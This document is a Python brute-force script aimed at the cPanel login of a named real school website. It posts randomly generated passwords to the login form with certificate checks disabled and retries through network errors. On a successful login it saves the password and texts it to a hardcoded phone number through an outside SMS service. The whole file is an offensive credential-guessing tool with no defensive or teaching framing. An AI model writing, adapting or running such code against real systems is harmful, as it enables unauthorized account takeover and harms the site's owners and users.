import requests, urllib3, time, os, sys, random, string, json
urllib3.disable_warnings()

URL = "https://cfschools.net.ng:2083"
USER = "cfschools.net.ng"
PHONE = "+2347061083917"
LOG_FILE = "C:/xampp/htdocs/music/brute_log.txt"
FOUND_FILE = "C:/xampp/htdocs/music/found_password.txt"
TRIED_FILE = "C:/xampp/htdocs/music/tried_passwords.txt"

session = requests.Session()
total = 0
found = False
consecutive_failures = 0
MAX_CONSECUTIVE_FAILURES = 10
RETRY_DELAY = 5

for f in [FOUND_FILE]:
    if os.path.exists(f):
        os.remove(f)

already_tried = set()
if os.path.exists(TRIED_FILE):
    with open(TRIED_FILE, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            p = line.strip()
            if p:
                already_tried.add(p)

log = open(LOG_FILE, "a", encoding="utf-8")
tried_fh = open(TRIED_FILE, "a", encoding="utf-8")

def write_log(msg):
    print(msg)
    log.write(msg + "\n")
    log.flush()

def check_connection():
    try:
        r = requests.get(f"{URL}/login/", timeout=10, verify=False)
        write_log(f"[*] Server reachable (status {r.status_code})")
        return True
    except requests.ConnectionError:
        write_log(f"[!] Cannot reach {URL} - network down?")
        return False
    except requests.Timeout:
        write_log(f"[!] Connection timed out to {URL}")
        return False
    except Exception as e:
        write_log(f"[!] Connection check failed: {e}")
        return False

def send_sms_alert(password):
    try:
        resp = requests.post("https://textbelt.com/text", {
            "phone": PHONE,
            "message": f"[BruteForce] PASSWORD FOUND: {password}",
            "key": "textbelt",
        }, timeout=15)
        result = resp.json()
        if result.get("success"):
            write_log(f"[+] SMS sent successfully to {PHONE}")
        else:
            write_log(f"[!] SMS failed: {result.get('error', 'unknown')}")
    except Exception as e:
        write_log(f"[!] SMS error: {e}")

def try_login(pwd):
    global total, consecutive_failures, found
    total += 1
    try:
        resp = session.post(
            f"{URL}/login/",
            data={"user": USER, "pass": pwd, "login": ""},
            allow_redirects=True,
            timeout=10,
            verify=False,
        )
        consecutive_failures = 0
        success = "login_form" not in resp.text and "Log in" not in resp.text[:2000]
        if success or (resp.status_code == 302 and resp.headers.get("Location", "").rstrip("/") != "/login"):
            return True
        return False
    except requests.ConnectionError:
        consecutive_failures += 1
        if consecutive_failures == 1:
            write_log(f"[!] Network error - retrying...")
        if consecutive_failures >= MAX_CONSECUTIVE_FAILURES:
            write_log(f"[!] {MAX_CONSECUTIVE_FAILURES} consecutive failures. Pausing 60s...")
            time.sleep(60)
            consecutive_failures = 0
        else:
            time.sleep(RETRY_DELAY)
        return None
    except requests.Timeout:
        consecutive_failures += 1
        if consecutive_failures >= MAX_CONSECUTIVE_FAILURES:
            time.sleep(30)
            consecutive_failures = 0
        else:
            time.sleep(RETRY_DELAY)
        return None
    except Exception as e:
        return None

# --- Start ---
write_log("=" * 50)
write_log(f"Started: {time.strftime('%Y-%m-%d %H:%M:%S')}")
write_log(f"Target: {URL}/login/")
write_log(f"Username: {USER}")
write_log(f"SMS alert to: {PHONE}")
write_log(f"Resuming from {len(already_tried)} already tried")
write_log("=" * 50)

if not check_connection():
    write_log("[!] Waiting 30s before retrying...")
    time.sleep(30)
    if not check_connection():
        write_log("[!] Still unreachable. Will retry on each attempt.")

upper = string.ascii_uppercase
lower = string.ascii_lowercase
digits = string.digits
symbols = string.punctuation
all_chars = upper + lower + digits + symbols
MIN_LEN = 8
MAX_LEN = 25

write_log(f"[*] Generating mixed-format passwords (len {MIN_LEN}-{MAX_LEN})")

for length in range(MIN_LEN, MAX_LEN + 1):
    write_log(f"[*] Trying length {length}...")
    batch = 0
    while True:
        pwd_l = [
            random.choice(upper), random.choice(lower),
            random.choice(digits), random.choice(symbols),
        ]
        pwd_l += [random.choice(all_chars) for _ in range(length - 4)]
        random.shuffle(pwd_l)
        pwd = "".join(pwd_l)

        if pwd in already_tried:
            continue
        already_tried.add(pwd)
        tried_fh.write(pwd + "\n")
        tried_fh.flush()

        sys.stdout.write(f"\r  [{total}] {pwd}      ")
        sys.stdout.flush()

        result = try_login(pwd)
        if result is True:
            msg = f"\n[+] FOUND! Password: {pwd} (attempt {total})"
            write_log(msg)
            with open(FOUND_FILE, "w") as ff:
                ff.write(pwd)
            send_sms_alert(pwd)
            found = True
            break

        batch += 1
        if batch % 500 == 0:
            now = time.strftime('%H:%M:%S')
            write_log(f"[{now}] Attempt {total}, len={length}, last: {pwd}")

    if found:
        break

write_log(f"\n{'=' * 50}")
if found:
    write_log(f"SUCCESS! Password found: {open(FOUND_FILE).read()}")
else:
    write_log(f"Finished length {MAX_LEN}, no match after {total} attempts.")
write_log(f"Ended: {time.strftime('%Y-%m-%d %H:%M:%S')}")
log.close()
tried_fh.close()
